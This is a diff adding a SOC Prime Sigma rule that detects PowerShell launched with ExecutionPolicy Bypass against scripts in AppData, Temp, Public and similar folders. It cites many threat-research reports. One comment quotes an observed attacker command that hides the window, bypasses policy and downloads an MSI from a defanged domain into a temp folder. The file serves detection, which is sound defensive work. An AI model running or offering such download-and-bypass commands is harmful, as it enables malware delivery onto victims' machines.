@@ -1,0 +1,79 @@
+id: M9SxG3V6cYFT
+name: Powershell Executing File In Suspicious Directory Using Bypass Execution Policy (via cmdline)
+body: |-
+  title: Powershell Executing File In Suspicious Directory Using Bypass Execution Policy (via cmdline)
+  id: c77d19cf-3624-4e67-9474-69b44568d39f
+  status: stable
+  author: SOC Prime Team
+  description: Adversaries may try to execute malicious powershell script by using bypass execution policy in order to perform malicious activity.
+  references:
+    - https://research.checkpoint.com/2026/tricks-from-the-past-deployed-via-signed-chatgpt-and-claude-binaries/
+    - https://www.genians.co.kr/en/blog/threat_intelligence/operation-gitpower
+    - https://www.securonix.com/blog/task-stomp-powershell-backdoor-document-theft-remote-access
+    - https://blog.polyswarm.io/the-job-offer-has-claws-mirage-kitten-deploys-noderabbit-and-pollcat
+    - https://www.genians.co.kr/en/blog/threat_intelligence/ai-agent-opencode
+    - https://www.levelblue.com/blogs/spiderlabs-blog/hiding-in-the-chain-multi-stage-lnk-attack-leveraging-ton-blockchain-to-deliver-node.js-backdoor
+    - https://blog.itochuci.co.jp/entry/2026/06/11/111500
+    - https://blog.itochuci.co.jp/entry/2026/06/11/110000
+    - https://www.fortinet.com/blog/threat-research/phishing-campaign-deploys-javascript-driven-purelogs-variant-to-steal-sensitive-data
+    - https://blog.talosintelligence.com/uat-8302/
+    - https://www.huntress.com/blog/komari-c2-agent-abuse
+    - https://cert.gov.ua/article/6288271
+    - https://www.esentire.com/blog/stx-rat-a-new-rat-in-2026-with-infostealer-capabilities
+    - https://www.pointwild.com/threat-intelligence/desckvb-rat-analysis-from-javascript-loader-to-fileless-net-rat/
+    - https://unit42.paloaltonetworks.com/analysis-of-bunnyloader-malware/
+    - https://blogs.blackberry.com/en/2024/04/fin7-targets-the-united-states-automotive-industry
+    - https://www.fortinet.com/blog/threat-research/fickle-stealer-distributed-via-multiple-attack-chain
+    - https://labs.k7computing.com/index.php/kematian-stealer-forked-from-powershell-token-grabber/
+    - https://hunt.io/blog/asyncrat-screenconnect-open-directory-campaigns
+    - https://www.acronis.com/en/tru/posts/boto-cor-de-rosa-campaign-reveals-astaroth-whatsapp-based-worm-activity-in-brazil/
+    - https://asec.ahnlab.com/en/92183/
+    - https://blackpointcyber.com/blog/novel-fake-captcha-chain-delivering-amatera-stealer/
+    - https://gmo-cybersecurity.com/blog/revisiting-gpugate-repo-squatting-and-opencl-deception-to-deliver-hijackloader/
+    - https://www.pointwild.com/threat-intelligence/when-malware-talks-back
+    - https://censys.com/blog/voicemail-trap-german-language-voicemail-lure-remote-access
+    - https://www.pointwild.com/threat-intelligence/when-malware-talks-back/
+    - https://www.security.com/threat-intelligence/iran-cyber-threat-activity-us
+    - https://www.threatdown.com/blog/castlerat-cyber-attack-is-the-first-to-abuse-deno-javascript-runtime-to-evade-enterprise-security/
+    - https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ai-written-malware-vibe-coded-campaign/
+    - https://www.elastic.co/security-labs/silentconnect-delivers-screenconnect
+    - https://www.recordedfuture.com/research/clickfix-campaigns-targeting-windows-and-macos
+  tags:
+    - attack.t1059.001
+    - attack.execution
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection_base:
+      Image|endswith: 'powershell.exe'
+      CommandLine|contains:
+        - 'Bypass'
+    selection_policy:
+      CommandLine|contains:
+        - '-ExecutionPolicy'
+        - '-ep'
+    selection_files:
+      CommandLine|contains:
+        - '-File ' #https://www.pointwild.com/threat-intelligence/when-malware-talks-back/; https://www.threatdown.com/blog/castlerat-cyber-attack-is-the-first-to-abuse-deno-javascript-runtime-to-evade-enterprise-security/; https://www.fortinet.com/blog/threat-research/phishing-campaign-deploys-javascript-driven-purelogs-variant-to-steal-sensitive-data; https://blog.polyswarm.io/the-job-offer-has-claws-mirage-kitten-deploys-noderabbit-and-pollcat
+        - '-f' #Powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy Bypass -File C:\Packages\Plugins\Microsoft.Azure.AzureDefenderForServers.MDE.Windows\1.0.3.1\\MdeExtensionHandler.ps1
+        - '-command' #powershell.exe -windowstyle hidden -executionpolicy bypass\ -command "invoke-webreguest 'hXXps://coffe-estilo[.]com/macforte/installer.msi' -outfile 'c:\temp\intalskji.msi'"; https://www.acronis.com/en/tru/posts/boto-cor-de-rosa-campaign-reveals-astaroth-whatsapp-based-worm-activity-in-brazil/; https://www.pointwild.com/threat-intelligence/when-malware-talks-back/; https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ai-written-malware-vibe-coded-campaign/
+    selection_dirs:
+      CommandLine|contains:
+        - 'AppData' # https://www.esentire.com/blog/stx-rat-a-new-rat-in-2026-with-infostealer-capabilities; https://cert.gov.ua/article/6288271; https://www.genians.co.kr/en/blog/threat_intelligence/ai-agent-opencode; https://www.securonix.com/blog/task-stomp-powershell-backdoor-document-theft-remote-access
+        - 'Temp' # https://www.recordedfuture.com/research/clickfix-campaigns-targeting-windows-and-macos; https://www.huntress.com/blog/komari-c2-agent-abuse; https://blog.talosintelligence.com/uat-8302/; https://blog.itochuci.co.jp/entry/2026/06/11/110000; https://www.levelblue.com/blogs/spiderlabs-blog/hiding-in-the-chain-multi-stage-lnk-attack-leveraging-ton-blockchain-to-deliver-node.js-backdoor; https://research.checkpoint.com/2026/tricks-from-the-past-deployed-via-signed-chatgpt-and-claude-binaries/
+        - 'WinSxS'
+        - '\Public' # https://www.pointwild.com/threat-intelligence/desckvb-rat-analysis-from-javascript-loader-to-fileless-net-rat/; https://www.genians.co.kr/en/blog/threat_intelligence/operation-gitpower
+        - ' \\'
+    filters:
+      CommandLine|contains:
+        - 'Filehash'
+        - 'Pycharm'
+        - 'Get-AuthenticodeSignature' #msi
+    condition: (selection_base and selection_files and selection_policy and selection_dirs) and not filters
+  falsepositives:
+    - Legitimate powershell script execution
+  level: medium
+level: medium
+created: '2024-03-27T14:56:51Z'
+updated: '2026-10-27T17:02:50.629000Z'
